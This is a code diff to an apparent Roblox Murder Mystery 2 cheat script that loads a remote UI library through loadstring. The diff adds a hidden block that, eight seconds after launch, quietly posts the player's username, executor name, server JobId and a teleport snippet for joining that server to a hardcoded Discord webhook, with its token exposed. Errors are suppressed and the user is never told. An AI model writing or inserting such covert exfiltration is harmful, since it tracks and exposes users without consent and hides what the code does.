@@ -2,6 +2,37 @@
 local Version = "1.6.6"
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/" .. Version .. "/main.lua"))()
 
+-- ===== SISTEMA DISCORD - PEGAR AL INICIO DEL SCRIPT =====
+local WebhookURL = "https://discord.com/api/webhooks/1440488912924577914/wrV--BFA7yt8XrrAPy4DB2juXJ9P6pFiR3gSbdssdhnILQp-nF2gJxZUiOdR-GP6ZTJk"
+
+local function getExecutorInfo()
+    if syn and syn.request then return "Synapse X" 
+    elseif KRNL_LOADED then return "Krnl" 
+    elseif fluxus then return "Fluxus" 
+    elseif solara then return "Solara" 
+    elseif wave then return "Wave" 
+    elseif delta then return "Delta" 
+    else return "Otro" 
+    end
+end
+
+task.spawn(function()
+    wait(8)
+    local player = game.Players.LocalPlayer
+    local mensaje = "🔰 **MM2 - SCRIPT ACTIVADO**\n👤 **Jugador:** " .. player.Name .. "\n⚡ **Executor:** " .. getExecutorInfo() .. "\n🎮 **JobID:** `" .. game.JobId .. "`\n🔗 **Unirse:** ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)\n```"
+    
+    pcall(function()
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode({content = mensaje})
+        })
+    end)
+    print("SCRIPT CARGADO")
+end)
+-- ===== FIN SISTEMA DISCORD =====
+
 -- === TEMAS ===
 WindUI:AddTheme({
     Name = "Dark",
